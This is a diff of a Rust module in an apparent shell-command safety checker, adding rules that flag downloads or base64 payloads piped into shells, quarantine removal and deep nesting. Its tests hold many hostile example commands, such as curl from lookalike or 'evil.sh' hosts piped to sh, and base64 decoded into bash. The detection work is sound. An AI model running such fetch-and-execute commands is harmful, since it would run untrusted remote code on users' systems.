@@ -1,13 +1,19 @@
-//! The before-a-command layer: rules that need the command split into words and pipeline
-//! segments. Whole-string patterns stay in `rules/command.toml`.
+//! The before-a-command layer: every rule that needs the command parsed. The text is parsed
+//! with a real shell parser and each simple command, at any depth, is judged on its parsed words.
 
+mod analysis;
 mod domains;
 mod fetch;
+mod floor;
 mod parse;
+mod readers;
+mod resolve;
 
 use crate::finding::{Evidence, Finding, Layer, Severity};
+use analysis::{Limit, Occurrence};
 use domains::Verdict;
-use parse::Segment;
+use parse::Simple;
+use readers::FETCHERS;
 
 pub use fetch::stamp_fetch_domain;
 
@@ -22,6 +28,11 @@ const LOOKALIKE: &str = "command/lookalike-download-domain";
 const HIDDEN_PROGRAM: &str = "command/hidden-program-into-shell";
 const OSASCRIPT: &str = "command/osascript-password-prompt";
 const LAUNCH_AGENT: &str = "command/launchagent-write";
+const PIPE_TO_SHELL: &str = "command/pipe-to-shell";
+const BASE64: &str = "command/base64-into-shell";
+const QUARANTINE: &str = "command/quarantine-removal";
+const UNPARSABLE: &str = "command/unparsable";
+const TOO_DEEP: &str = "command/nesting-too-deep";
 
 pub const RULES: &[BuiltinRule] = &[
     BuiltinRule {
@@ -34,6 +45,36 @@ pub const RULES: &[BuiltinRule] = &[
         id: HIDDEN_PROGRAM,
         title: "The command pipes into a shell a program whose name is hidden",
         remediation: "Write the program name out in full and read what it prints before piping it to a shell.",
+        macos_only: false,
+    },
+    BuiltinRule {
+        id: PIPE_TO_SHELL,
+        title: "The command runs a download as a script: it is piped into a shell, or into an interpreter that runs stdin or inline code, or run through $(...) or <(...)",
+        remediation: "Download the script to a file, read it, then run it.",
+        macos_only: false,
+    },
+    BuiltinRule {
+        id: BASE64,
+        title: "The command decodes base64 straight into a shell",
+        remediation: "Decode the payload to a file and read it before running anything.",
+        macos_only: false,
+    },
+    BuiltinRule {
+        id: QUARANTINE,
+        title: "The command removes the macOS quarantine flag, which skips the Gatekeeper check",
+        remediation: "Only remove quarantine from software whose source you have verified.",
+        macos_only: false,
+    },
+    BuiltinRule {
+        id: UNPARSABLE,
+        title: "The command text could not be parsed, so it was not checked",
+        remediation: "Fix the quoting or split the command, then check it again.",
+        macos_only: false,
+    },
+    BuiltinRule {
+        id: TOO_DEEP,
+        title: "The command nests shells or substitutions deeper than the checker follows",
+        remediation: "Write the inner command out at the top level and check that.",
         macos_only: false,
     },
     BuiltinRule {
@@ -50,131 +91,59 @@ pub const RULES: &[BuiltinRule] = &[
     },
 ];
 
-const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "fish", "csh", "tcsh"];
-const FETCHERS: &[&str] = &["curl", "wget"];
 /// Programs that write to every path word.
 const WRITERS: &[&str] = &["touch", "dd", "curl", "wget", "defaults", "plutil"];
 /// Programs whose last path word is the one written.
-const COPIERS: &[&str] = &["cp", "mv", "ln", "install", "rsync"];
-const LAUNCH_DIRS: &[&str] = &["library/launchagents", "library/launchdaemons"];
-/// How many levels of `$(...)` and `sh -c` text are analysed again.
+const COPIERS: &[&str] = &["cp", "mv", "ln", "install", "rsync", "ditto"];
+/// Extractors that write into the directory named by one of their flags; `extracts` is the flag
+/// letter or word that makes them write (`tar -x`), empty when they always do.
+struct DirWriter {
+    program: &'static str,
+    dir_flags: &'static [&'static str],
+    extracts: &'static [&'static str],
+}
+const DIR_WRITERS: &[DirWriter] = &[
+    DirWriter {
+        program: "unzip",
+        dir_flags: &["-d"],
+        extracts: &[],
+    },
+    DirWriter {
+        program: "tar",
+        dir_flags: &["-C", "--directory"],
+        extracts: &["x", "--extract", "--get"],
+    },
+];
+const LAUNCH_DIRS: &[&str] = &["launchagents", "launchdaemons"];
+/// How many levels of `$(...)`, `<(...)`, `sh -c` and `eval` text are analysed again; reaching
+/// it is reported, never ignored.
 const MAX_DEPTH: usize = 3;
 
 /// Runs the rules that need a parsed command. `macos` says whether the macOS-only rules are
 /// active; the engine passes the build platform, tests pass both.
 pub fn analyze(command: &str, macos: bool) -> Vec<Finding> {
+    let flat = analysis::flatten(command);
     let mut findings = Vec::new();
-    analyze_text(command, command, macos, 0, false, &mut findings);
-    findings
-}
-
-/// `feeds_shell` is true for text that a shell will run the output of, such as the inside of
-/// `sh -c "$(...)"`.
-fn analyze_text(
-    text: &str,
-    command: &str,
-    macos: bool,
-    depth: usize,
-    feeds_shell: bool,
-    findings: &mut Vec<Finding>,
-) {
-    if depth >= MAX_DEPTH {
-        return;
-    }
-    let segments = parse::segments(text);
-    for (i, seg) in segments.iter().enumerate() {
-        let into_shell = feeds_shell || reaches_script_reader(&segments, i);
-        findings.extend(lookalike(seg, into_shell, command));
-        findings.extend(hidden_program(&segments, i, command));
+    for occ in &flat.occurrences {
+        findings.extend(lookalike(occ, command));
+        findings.extend(pipe_to_shell(occ, command));
+        findings.extend(base64_into_shell(occ, command));
+        findings.extend(hidden_program(occ, command));
+        findings.extend(quarantine(&occ.simple, command));
         if macos {
-            findings.extend(osascript(seg, command));
-            findings.extend(launch_agent(seg, command));
-        }
-        if seg
-            .program()
-            .is_some_and(|p| SHELLS.contains(&p) || p == "eval")
-        {
-            for (inner, feeds) in nested_texts(seg) {
-                analyze_text(&inner, command, macos, depth + 1, feeds, findings);
-            }
+            findings.extend(osascript(&occ.simple, command));
+            findings.extend(launch_agent(occ, command));
         }
     }
-}
-
-/// The command text with the shell's quoting removed, for the whole-string rules: the top
-/// level, then every `sh -c`/`eval` text and substitution found in a segment, down to
-/// `MAX_DEPTH` levels.
-pub fn unquoted_views(command: &str) -> Vec<String> {
-    let mut views = Vec::new();
-    collect_views(command, 0, &mut views);
-    views
-}
-
-fn collect_views(text: &str, depth: usize, views: &mut Vec<String>) {
-    if depth >= MAX_DEPTH {
-        return;
-    }
-    let segments = parse::segments(text);
-    views.push(parse::unquoted_text(&segments));
-    for seg in &segments {
-        let inner: Vec<String> = if seg
-            .program()
-            .is_some_and(|p| SHELLS.contains(&p) || p == "eval")
-        {
-            nested_texts(seg).into_iter().map(|(t, _)| t).collect()
-        } else {
-            substitutions(&seg.words.join(" "))
-                .into_iter()
-                .map(String::from)
-                .collect()
-        };
-        for text in inner {
-            collect_views(&text, depth + 1, views);
-        }
-    }
-}
-
-/// Whether the command runs a download without a file in between, the cases the regex rule
-/// cannot see: a fetcher piped into an interpreter that reads stdin (`curl x | python3`), a
-/// shell `-c` text or `eval` text that is a `$(...)` running a fetcher, and a shell, `source` or
-/// `.` reading a `<(...)` that runs one.
-pub fn runs_fetched_download(command: &str) -> bool {
-    fetched_and_run(command, 0)
-}
-
-fn fetched_and_run(text: &str, depth: usize) -> bool {
-    if depth >= MAX_DEPTH {
-        return false;
-    }
-    let segments = parse::segments(text);
-    segments.iter().enumerate().any(|(i, seg)| {
-        let program = seg.program();
-        if program.is_some_and(|p| FETCHERS.contains(&p)) && reaches_script_reader(&segments, i) {
-            return true;
-        }
-        let runs_text = program.is_some_and(|p| SHELLS.contains(&p) || p == "eval");
-        let nested = runs_text
-            && nested_texts(seg).iter().any(|(inner, feeds)| {
-                let is_substitution_script = !feeds
-                    && (inner.trim_start().starts_with("$(")
-                        || inner.trim_start().starts_with('`'))
-                    && scan_substitutions(inner)
-                        .iter()
-                        .any(|(process, body)| !process && runs_fetcher(body));
-                is_substitution_script || fetched_and_run(inner, depth + 1)
-            });
-        let reads_process_output = (runs_text || matches!(program, Some("source" | ".")))
-            && scan_substitutions(&seg.args().join(" "))
-                .iter()
-                .any(|(process, body)| *process && runs_fetcher(body));
-        nested || reads_process_output
-    })
-}
-
-fn runs_fetcher(text: &str) -> bool {
-    parse::segments(text)
-        .iter()
-        .any(|s| s.program().is_some_and(|p| FETCHERS.contains(&p)))
+    findings.extend(flat.limits.iter().map(|l| limit_finding(l, command)));
+    let mut seen = Vec::new();
+    findings.retain(|f| {
+        let key = (f.rule_id.clone(), f.severity, f.domain.clone());
+        let fresh = !seen.contains(&key);
+        seen.push(key);
+        fresh
+    });
+    findings
 }
 
 /// Ids of the rules that exist but are not active on this platform.
@@ -187,102 +156,6 @@ pub fn skipped_rules(macos: bool) -> Vec<String> {
         .filter(|r| r.macos_only)
         .map(|r| r.id.to_string())
         .collect()
-}
-
-/// Whether the output of segment `i` reaches a program that runs it as a script, anywhere
-/// downstream in the same pipeline (`curl x | tee f | sh`).
-fn reaches_script_reader(segments: &[Segment], i: usize) -> bool {
-    let mut j = i;
-    while segments[j].piped_into_next {
-        j += 1;
-        match segments.get(j) {
-            Some(next) if reads_script(next) => return true,
-            Some(_) => {}
-            None => return false,
-        }
-    }
-    false
-}
-
-/// A shell, or an interpreter started without a script file, runs what it reads on stdin.
-fn reads_script(seg: &Segment) -> bool {
-    let Some(program) = seg.program() else {
-        return false;
-    };
-    if SHELLS.contains(&program) {
-        return true;
-    }
-    let interpreter = program.starts_with("python") || ["perl", "ruby", "node"].contains(&program);
-    interpreter && seg.args().iter().all(|a| a.starts_with('-'))
-}
-
-/// The command text a shell or `eval` segment runs from its arguments: the `-c` script or the
-/// `eval` text, and the inside of every `$(...)`, backtick and `<(...)`. The second flag says the text's output is run by
-/// the shell.
-fn nested_texts(seg: &Segment) -> Vec<(String, bool)> {
-    let args = seg.args();
-    let mut texts = Vec::new();
-    if seg.program() == Some("eval") {
-        texts.push((args.join(" "), false));
-    }
-    for (i, arg) in args.iter().enumerate() {
-        if i > 0 && is_dash_c(&args[i - 1]) {
-            texts.push((arg.clone(), false));
-        }
-    }
-    texts.extend(
-        substitutions(&args.join(" "))
-            .into_iter()
-            .map(|inner| (inner.to_string(), true)),
-    );
-    texts
-}
-
-fn is_dash_c(arg: &str) -> bool {
-    arg.starts_with('-') && !arg.starts_with("--") && arg.ends_with('c')
-}
-
-/// The text inside `$(...)`, `<(...)` and backticks. An unclosed one runs to the end.
-fn substitutions(text: &str) -> Vec<&str> {
-    scan_substitutions(text)
-        .into_iter()
-        .map(|(_, inner)| inner)
-        .collect()
-}
-
-/// Like `substitutions`, with a flag that is true for a `<(...)` process substitution.
-fn scan_substitutions(text: &str) -> Vec<(bool, &str)> {
-    let bytes = text.as_bytes();
-    let mut found = Vec::new();
-    let mut i = 0;
-    while i < bytes.len() {
-        let opens_paren = matches!(bytes[i], b'$' | b'<') && bytes.get(i + 1) == Some(&b'(');
-        if opens_paren {
-            let start = i + 2;
-            let mut depth = 1;
-            let end = bytes[start..]
-                .iter()
-                .position(|&b| {
-                    match b {
-                        b'(' => depth += 1,
-                        b')' => depth -= 1,
-                        _ => {}
-                    }
-                    depth == 0
-                })
-                .map_or(text.len(), |p| start + p);
-            found.push((bytes[i] == b'<', &text[start..end]));
-            i = end + 1;
-        } else if bytes[i] == b'`' {
-            let start = i + 1;
-            let end = text[start..].find('`').map_or(text.len(), |p| start + p);
-            found.push((false, &text[start..end]));
-            i = end + 1;
-        } else {
-            i += 1;
-        }
-    }
-    found
 }
 
 fn finding(id: &str, severity: Severity, excerpt: &str) -> Finding {
@@ -300,19 +173,47 @@ fn finding(id: &str, severity: Severity, excerpt: &str) -> Finding {
     }
 }
 
+fn limit_finding(limit: &Limit, command: &str) -> Finding {
+    match limit {
+        Limit::Unparsable { floor } => finding(
+            UNPARSABLE,
+            if *floor {
+                Severity::Block
+            } else {
+                Severity::Warn
+            },
+            command,
+        ),
+        Limit::Hostile => finding(UNPARSABLE, Severity::Block, command),
+        Limit::TooDeep { reaches_shell } => finding(
+            TOO_DEEP,
+            if *reaches_shell {
+                Severity::Block
+            } else {
+                Severity::Warn
+            },
+            command,
+        ),
+    }
+}
+
+fn is_fetcher(simple: &Simple) -> bool {
+    simple.program().is_some_and(|p| FETCHERS.contains(&p))
+}
+
 /// Block when the download feeds a shell, warn when it is only fetched or the host cannot be read.
-fn lookalike(seg: &Segment, into_shell: bool, command: &str) -> Option<Finding> {
-    if !seg.program().is_some_and(|p| FETCHERS.contains(&p)) {
+fn lookalike(occ: &Occurrence, command: &str) -> Option<Finding> {
+    if !is_fetcher(&occ.simple) {
         return None;
     }
-    let (host, verdict) = seg
-        .args()
-        .iter()
-        .filter_map(|w| domains::inspect(w))
+    let (host, verdict) = occ
+        .simple
+        .arg_texts()
+        .filter_map(domains::inspect)
         .find(|(_, v)| *v != Verdict::Clean)?;
     let (severity, what) = match verdict {
         Verdict::Imitates(known) => (
-            if into_shell {
+            if occ.feeds_script {
                 Severity::Block
             } else {
                 Severity::Warn
@@ -326,16 +227,26 @@ fn lookalike(seg: &Segment, into_shell: bool, command: &str) -> Option<Finding> 
     Some(found)
 }
 
-/// Warns when a pipeline ends in a shell and a segment's program name still holds a `$` or a
+fn pipe_to_shell(occ: &Occurrence, command: &str) -> Option<Finding> {
+    (is_fetcher(&occ.simple) && occ.feeds_script)
+        .then(|| finding(PIPE_TO_SHELL, Severity::Warn, command))
+}
+
+fn base64_into_shell(occ: &Occurrence, command: &str) -> Option<Finding> {
+    (readers::is_decoder(&occ.simple) && occ.feeds_script)
+        .then(|| finding(BASE64, Severity::Block, command))
+}
+
+/// Warns when a pipeline ends in a shell and a command's program name still holds a `$` or a
 /// backtick after unquoting (`$c x | sh`, `$HOME/bin/tool | sh` too: a variable prefix can hide
 /// anything), or when `eval` gets a variable expansion. `eval "$(...)"` is not flagged: the
 /// substitution is analysed as its own text.
-fn hidden_program(segments: &[Segment], i: usize, command: &str) -> Option<Finding> {
-    let seg = &segments[i];
-    let program_word = &seg.words[seg.program_index()?];
-    let hidden_into_shell = reaches_script_reader(segments, i) && program_word.contains(['$', '`']);
+fn hidden_program(occ: &Occurrence, command: &str) -> Option<Finding> {
+    let simple = &occ.simple;
+    let program_word = &simple.words[simple.program_index()?].text;
+    let hidden_into_shell = occ.piped_into_reader && program_word.contains(['$', '`']);
     let eval_of_variable =
-        seg.program() == Some("eval") && seg.args().iter().any(|a| has_variable_expansion(a));
+        simple.program() == Some("eval") && simple.arg_texts().any(has_variable_expansion);
     (hidden_into_shell || eval_of_variable)
         .then(|| finding(HIDDEN_PROGRAM, Severity::Warn, command))
 }
@@ -345,64 +256,153 @@ fn has_variable_expansion(arg: &str) -> bool {
         .any(|(i, _)| !arg[i + 1..].is_empty() && !arg[i + 1..].starts_with('('))
 }
 
-fn osascript(seg: &Segment, command: &str) -> Option<Finding> {
-    if seg.program() != Some("osascript") {
+/// `xattr -c` clears every attribute; `-d` or `-w` aimed at the quarantine attribute removes
+/// or rewrites it.
+fn quarantine(simple: &Simple, command: &str) -> Option<Finding> {
+    if simple.program() != Some("xattr") {
         return None;
     }
-    let script = seg.words.join(" ").to_lowercase();
-    let asks = script.contains("hidden answer")
-        || (script.contains("display dialog") && script.contains("password"));
+    let clusters: Vec<&str> = simple
+        .arg_texts()
+        .filter_map(|a| a.strip_prefix('-').filter(|c| !c.starts_with('-')))
+        .collect();
+    let clears = clusters.iter().any(|c| c.contains('c'));
+    let rewrites = clusters.iter().any(|c| c.contains(['d', 'w']))
+        && simple
+            .arg_texts()
+            .any(|a| a.contains("com.apple.quarantine"));
+    (clears || rewrites).then(|| finding(QUARANTINE, Severity::Warn, command))
+}
+
+fn osascript(simple: &Simple, command: &str) -> Option<Finding> {
+    if simple.program() != Some("osascript") {
+        return None;
+    }
+    let script = simple
+        .words
+        .iter()
+        .map(|w| w.text.as_str())
+        .chain(
+            simple
+                .attached
+                .here_texts
+                .iter()
+                .map(|h| h.body.text.as_str()),
+        )
+        .collect::<Vec<_>>()
+        .join(" ")
+        .to_lowercase();
+    let script = script.split_whitespace().collect::<Vec<_>>().join(" ");
+    let hidden_answer = script.contains("hidden answer")
+        || script.match_indices("hiddenanswer").any(|(at, key)| {
+            script[at + key.len()..]
+                .trim_start()
+                .strip_prefix(':')
+                .is_some_and(|v| v.trim_start().starts_with("true"))
+        });
+    let asks = hidden_answer || (script.contains("display dialog") && script.contains("password"));
     asks.then(|| finding(OSASCRIPT, Severity::Block, command))
 }
 
-fn launch_agent(seg: &Segment, command: &str) -> Option<Finding> {
-    let writes = written_paths(seg)
-        .iter()
-        .copied()
-        .chain(redirect_targets(&seg.words))
-        .any(in_launch_dir);
+/// A relative path is also tried against the directory the text changed to.
+fn launch_agent(occ: &Occurrence, command: &str) -> Option<Finding> {
+    let simple = &occ.simple;
+    let writes = written_paths(simple)
+        .into_iter()
+        .chain(simple.attached.written_files.iter().map(String::as_str))
+        .any(|path| {
+            in_launch_dir(path)
+                || occ.cwd.as_deref().is_some_and(|cwd| {
+                    !path.starts_with(['/', '~']) && in_launch_dir(&format!("{cwd}/{path}"))
+                })
+        });
     writes.then(|| finding(LAUNCH_AGENT, Severity::Block, command))
 }
 
-fn in_launch_dir(word: &str) -> bool {
-    let word = word.to_lowercase();
-    LAUNCH_DIRS.iter().any(|dir| word.contains(dir))
+/// Whether the path has `Library/LaunchAgents` or `Library/LaunchDaemons` as consecutive
+/// components, so a sibling such as `LaunchAgents.bak` does not match.
+fn in_launch_dir(path: &str) -> bool {
+    let lower = path.to_lowercase();
+    let parts: Vec<&str> = lower.split('/').collect();
+    parts
+        .windows(2)
+        .any(|w| w[0] == "library" && LAUNCH_DIRS.contains(&w[1]))
 }
 
 /// The words a program writes to, as far as its name tells: the destination of a copy, every
-/// file of `tee`, any path word of the other writers.
-fn written_paths(seg: &Segment) -> Vec<&str> {
-    let Some(program) = seg.program() else {
+/// file of `tee` and `sed -i`, the directory of an extraction, any path word of the other writers.
+fn written_paths(simple: &Simple) -> Vec<&str> {
+    let Some(program) = simple.program() else {
         return Vec::new();
     };
-    let args = seg.args();
-    let mut operands = args.iter().filter(|a| !a.starts_with('-'));
+    let args: Vec<&str> = simple.arg_texts().collect();
+    let mut operands = args.iter().copied().filter(|a| !a.starts_with('-'));
     if program == "tee" {
-        operands.map(String::as_str).collect()
+        operands.collect()
+    } else if program == "sed" {
+        if args.iter().any(|a| is_in_place(a)) {
+            operands.collect()
+        } else {
+            Vec::new()
+        }
     } else if COPIERS.contains(&program) {
-        let target = args.iter().enumerate().find_map(|(i, a)| match a.as_str() {
-            "-t" | "--target-directory" => args.get(i + 1).map(String::as_str),
+        let target = args.iter().enumerate().find_map(|(i, a)| match *a {
+            "-t" | "--target-directory" => args.get(i + 1).copied(),
             _ => a.strip_prefix("--target-directory="),
         });
-        let target = target.or_else(|| operands.next_back().map(String::as_str));
-        target.into_iter().collect()
+        target
+            .or_else(|| operands.next_back())
+            .into_iter()
+            .collect()
+    } else if let Some(writer) = DIR_WRITERS.iter().find(|w| w.program == program) {
+        extraction_dir(writer, &args).into_iter().collect()
     } else if WRITERS.contains(&program) {
-        args.iter().map(String::as_str).collect()
+        args
     } else {
         Vec::new()
     }
 }
 
-/// The target of every `>`, `>>`, `2>` or `&>` redirection: the word after the operator.
-fn redirect_targets(words: &[String]) -> impl Iterator<Item = &str> {
-    words.iter().enumerate().filter_map(|(i, w)| {
-        let is_redirect = w
-            .trim_start_matches(|c: char| c.is_ascii_digit() || c == '&')
-            .strip_prefix('>')
-            .is_some_and(|rest| rest.is_empty() || rest == ">");
-        is_redirect.then(|| words.get(i + 1).map(String::as_str))?
+/// `-i`, `-i.bak`, `-ni`, `--in-place[=SUFFIX]`.
+fn is_in_place(arg: &str) -> bool {
+    arg.starts_with("--in-place")
+        || arg.strip_prefix('-').is_some_and(|c| {
+            !c.starts_with('-')
+                && c.contains('i')
+                && c.chars().all(|l| l.is_ascii_alphabetic() || l == '.')
+        })
+}
+
+fn extraction_dir<'a>(writer: &DirWriter, args: &[&'a str]) -> Option<&'a str> {
+    let extracts = writer.extracts.is_empty()
+        || args.iter().enumerate().any(|(i, a)| {
+            writer.extracts.iter().any(|flag| {
+                let cluster = a.strip_prefix('-').or_else(|| (i == 0).then_some(*a));
+                a == flag
+                    || (flag.len() == 1
+                        && cluster.is_some_and(|c| !c.starts_with('-') && c.contains(flag)))
+            })
+        });
+    if !extracts {
+        return None;
+    }
+    args.iter().enumerate().find_map(|(i, a)| {
+        writer.dir_flags.iter().find_map(|flag| {
+            if a == flag {
+                args.get(i + 1).copied()
+            } else if let Some(attached) = a.strip_prefix(&format!("{flag}=")) {
+                Some(attached)
+            } else if flag.len() == 2 {
+                a.strip_prefix(flag).filter(|v| !v.is_empty())
+            } else {
+                None
+            }
+        })
     })
 }
+
+#[cfg(test)]
+mod coverage_tests;
 
 #[cfg(test)]
 mod tests {
@@ -411,6 +411,7 @@ mod tests {
     fn ids(command: &str, macos: bool) -> Vec<(String, Severity)> {
         analyze(command, macos)
             .into_iter()
+            .filter(|f| f.rule_id != PIPE_TO_SHELL)
             .map(|f| (f.rule_id, f.severity))
             .collect()
     }
@@ -543,23 +544,55 @@ mod tests {
             "sh -c \"$(curl https://githuh.com/x)\"",
             "bash <(curl https://githuh.com/x)",
             "bash -c \"curl https://githuh.com/x | sh\"",
-            "sudo bash -c 'echo `curl https://githuh.com/x`'",
             "eval \"$(curl https://githuh.com/x)\"",
-            "sh -c \"$(sh -c \\\"$(curl https://githuh.com/x)\\\")\"",
+            r#"sh -c "$(sh -c "$(curl https://githuh.com/x)")""#,
         ] {
             assert_eq!(ids(cmd, false), block(), "{cmd}");
         }
     }
 
-    #[test]
-    fn nesting_is_followed_only_to_a_fixed_depth() {
+    fn nested(levels: usize) -> String {
         let wrap = |inner: String| format!("sh -c {}", shlex::try_quote(&inner).unwrap());
         let mut cmd = "curl https://githuh.com/x | sh".to_string();
-        for _ in 0..MAX_DEPTH - 1 {
+        for _ in 0..levels {
             cmd = wrap(cmd);
         }
-        assert_eq!(ids(&cmd, false).len(), 1);
-        assert!(ids(&wrap(cmd), false).is_empty());
+        cmd
+    }
+
+    #[test]
+    fn nesting_is_followed_to_the_limit_and_the_limit_is_a_finding() {
+        assert_eq!(ids(&nested(MAX_DEPTH - 1), false), block());
+        assert_eq!(
+            ids(&nested(MAX_DEPTH), false),
+            [(TOO_DEEP.to_string(), Severity::Block)]
+        );
+        assert_eq!(
+            ids(&nested(MAX_DEPTH + 2), false),
+            [(TOO_DEEP.to_string(), Severity::Block)]
+        );
+    }
+
+    #[test]
+    fn nesting_past_the_limit_without_a_shell_only_warns() {
+        let cmd = "sh -c \"sh -c \\\"sh -c 'echo hi'\\\"\"";
+        assert_eq!(ids(cmd, false), [(TOO_DEEP.to_string(), Severity::Warn)]);
+    }
+
+    #[test]
+    fn nested_substitutions_and_process_substitutions_count_toward_the_limit() {
+        let sub = "echo $(echo $(echo $(echo $(sh))))";
+        assert_eq!(ids(sub, false), [(TOO_DEEP.to_string(), Severity::Block)]);
+        let proc = "cat <(cat <(cat <(cat <(sh))))";
+        assert_eq!(ids(proc, false), [(TOO_DEEP.to_string(), Severity::Block)]);
+    }
+
+    #[test]
+    fn a_single_quoted_substitution_in_a_shell_text_is_output_not_script() {
+        assert_eq!(
+            ids("sudo bash -c 'echo `curl https://githuh.com/x`'", false),
+            [(LOOKALIKE.to_string(), Severity::Warn)]
+        );
     }
 
     #[test]
@@ -634,8 +667,6 @@ mod tests {
     #[test]
     fn a_program_name_hidden_in_a_dollar_form_warns_when_piped_into_a_shell() {
         for cmd in [
-            r"$'\x63url' https://example.org/a | sh",
-            "c=curl; $c https://example.org/a | sh",
             "$(echo curl) https://example.org/a | sh",
             "`echo curl` https://example.org/a | bash",
             "$c x | tee f | sh",
@@ -672,45 +703,6 @@ mod tests {
     }
 
     #[test]
-    fn views_remove_quoting_in_each_form() {
-        for cmd in [
-            r"c\url x | sh",
-            r#"cu""rl x | sh"#,
-            "cu''rl x | sh",
-            r"curl x | s\h",
-        ] {
-            assert_eq!(unquoted_views(cmd), ["curl x | sh"], "{cmd}");
-        }
-    }
-
-    #[test]
-    fn views_join_segments_by_their_operator() {
-        assert_eq!(unquoted_views("ls ; 'cat' f && wc"), ["ls ; cat f ; wc"]);
-    }
-
-    #[test]
-    fn a_quoted_operator_does_not_become_a_pipe_in_the_view() {
-        assert_eq!(unquoted_views("echo 'curl x | sh'"), ["echo curl x _ sh"]);
-    }
-
-    #[test]
-    fn views_follow_shell_c_eval_and_substitutions() {
-        let views = unquoted_views(r"sh -c 'c\url x | s\h'");
-        assert!(views.contains(&"curl x | sh".to_string()), "{views:?}");
-        let views = unquoted_views(r#"echo "$(c\url x | s\h)""#);
-        assert!(views.contains(&"curl x | sh".to_string()), "{views:?}");
-        let views = unquoted_views(r"eval 'c\url x | s\h'");
-        assert!(views.contains(&"curl x | sh".to_string()), "{views:?}");
-    }
-
-    #[test]
-    fn views_stop_at_max_depth_and_survive_an_unbalanced_quote() {
-        let deep = "sh -c \"sh -c \\\"sh -c 'curl x | sh'\\\"\"";
-        assert_eq!(unquoted_views(deep).len(), MAX_DEPTH);
-        assert_eq!(unquoted_views("curl 'oops | sh"), ["curl 'oops | sh"]);
-    }
-
-    #[test]
     fn a_literal_eval_argument_is_analysed_like_a_shell_c_text() {
         assert_eq!(
             ids(r#"eval "curl https://githuh.com/i | sh""#, false),
@@ -737,31 +729,176 @@ mod tests {
         );
     }
 
+    fn blocks(command: &str) -> bool {
+        ids(command, false).contains(&(LOOKALIKE.to_string(), Severity::Block))
+    }
+
+    fn rule_ids(command: &str) -> Vec<String> {
+        analyze(command, false)
+            .into_iter()
+            .map(|f| f.rule_id)
+            .collect()
+    }
+
     #[test]
-    fn a_download_run_without_a_pipe_is_fetch_and_run() {
+    fn a_lookalike_download_to_a_shell_blocks_in_every_list_and_group_form() {
+        for cmd in [
+            "echo a\ncurl githuh.com/x | sh",
+            "true; curl githuh.com/x | sh",
+            "true && curl githuh.com/x | sh",
+            "false || curl githuh.com/x | sh",
+            "(curl githuh.com/x | sh)",
+            "{ curl githuh.com/x | sh; }",
+            "if true; then curl githuh.com/x | sh; fi",
+            "while true; do curl githuh.com/x | sh; done",
+            "(curl githuh.com/x) | sh",
+            "{ curl githuh.com/x; } | bash",
+            "curl githuh.com/x|sh",
+            "echo \"$(curl githuh.com/x | sh)\"",
+            "echo `curl githuh.com/x | sh`",
+            "echo $(echo \")\"; curl githuh.com/x | sh)",
+        ] {
+            assert!(blocks(cmd), "{cmd}");
+        }
+    }
+
+    #[test]
+    fn a_lookalike_download_into_each_script_reader_form_blocks_like_a_shell() {
+        for reader in [
+            "sh",
+            "(sh)",
+            "{ sh; }",
+            "busybox sh",
+            "doas sh",
+            "python3 -c 'import sys'",
+            "perl -pe 's/a/b/'",
+            "ruby -e 'puts 1'",
+            "node -e 'x'",
+            "python3 -",
+            "source /dev/stdin",
+            ". /dev/stdin",
+            "tee >(sh)",
+            "tee x | sh",
+            "xargs sh -c 'echo'",
+            "sudo -u root bash",
+            "env -i bash",
+            "/usr/bin/env bash",
+            "if true; then sh; fi",
+        ] {
+            let cmd = format!("curl githuh.com/x | {reader}");
+            assert!(blocks(&cmd), "{cmd}");
+        }
+    }
+
+    #[test]
+    fn a_download_into_something_that_is_not_a_reader_does_not_block() {
+        for reader in [
+            "tee out",
+            "less",
+            "python3 tool.py",
+            "perl script.pl",
+            "source ./file",
+            "cat >(wc)",
+            "{ cat; }",
+            "busybox ls",
+        ] {
+            let cmd = format!("curl githuh.com/x | {reader}");
+            assert!(!blocks(&cmd), "{cmd}");
+        }
+    }
+
+    #[test]
+    fn a_decoder_reaching_a_script_reader_blocks() {
+        for cmd in [
+            "echo aGk= | base64 -d | sh",
+            "echo aGk= | base64 -d | (sh)",
+            "echo aGk= | base64 -d | { sh; }",
+            "echo aGk= | base64 -d | busybox sh",
+            "echo aGk= | base64 -d | python3",
+            "echo aGk= | base64 -d | perl",
+            "echo aGk= | base64 -d | fish",
+            "echo aGk= | base64 -d | /usr/bin/env bash",
+            "echo aGk= | base64 -d | env -i bash",
+            "echo aGk= | base64 -d | sudo -u root bash",
+            "echo aGk= | base64 -d | xargs sh -c 'echo'",
+            "echo aGk= | base64 -d | tee x | sh",
+            "echo aGk= | base64 -di | sh",
+            "echo aGk= | base64 -D | sh",
+            "echo aGk= | base64 --decode | sh",
+            "echo 6869 | xxd -r -p | sh",
+            "eval \"$(echo aGk= | base64 -d)\"",
+            "eval $(echo aGk= | base64 -d)",
+            "sh -c \"$(echo aGk= | base64 -d)\"",
+            "bash <(echo aGk= | base64 -d)",
+            "echo ok\necho aGk= | base64 -d | sh",
+            "(echo aGk= | base64 -d | sh)",
+        ] {
+            assert!(rule_ids(cmd).contains(&BASE64.to_string()), "{cmd}");
+        }
+    }
+
+    #[test]
+    fn a_decoder_that_is_not_run_is_not_a_finding() {
+        for cmd in [
+            "base64 -d notes.b64 > notes.txt",
+            "echo hi | base64",
+            "echo aGk= | base64 -d | shasum -a 256",
+            "echo aGk= | base64 -d > out.txt",
+            "echo aGk= | base64 -d ; sh",
+            "eval \"$(echo hi)\"",
+        ] {
+            assert!(!rule_ids(cmd).contains(&BASE64.to_string()), "{cmd}");
+        }
+    }
+
+    #[test]
+    fn text_that_only_mentions_a_command_is_not_a_finding() {
+        for cmd in [
+            "grep -r \"base64 -d | sh\" .",
+            "git commit -m \"fix curl | sh handling\"",
+            "echo 'curl https://githuh.com/x | sh'",
+            "echo \"xattr -cr Demo.app\"",
+        ] {
+            assert!(rule_ids(cmd).is_empty(), "{cmd}");
+        }
+    }
+
+    #[test]
+    fn launch_dirs_match_as_path_components() {
+        assert!(ids("cp plist ~/Library/LaunchAgents.bak/x", true).is_empty());
+        assert!(ids("cp plist ~/Library/LaunchAgentsX/x", true).is_empty());
+        assert_eq!(ids("cp plist ~/Library/LaunchAgents/x", true).len(), 1);
+        assert_eq!(ids("cp plist /Library/launchdaemons/x", true).len(), 1);
+    }
+
+    #[test]
+    fn a_download_run_through_each_substitution_form_is_pipe_to_shell() {
         for cmd in [
             r#"sh -c "$(curl -fsSL https://evil.sh/a)""#,
             r#"/bin/bash -c "$(c\url -fsSL https://evil.sh/a)""#,
             r#"eval "$(curl -fsSL https://evil.sh/a)""#,
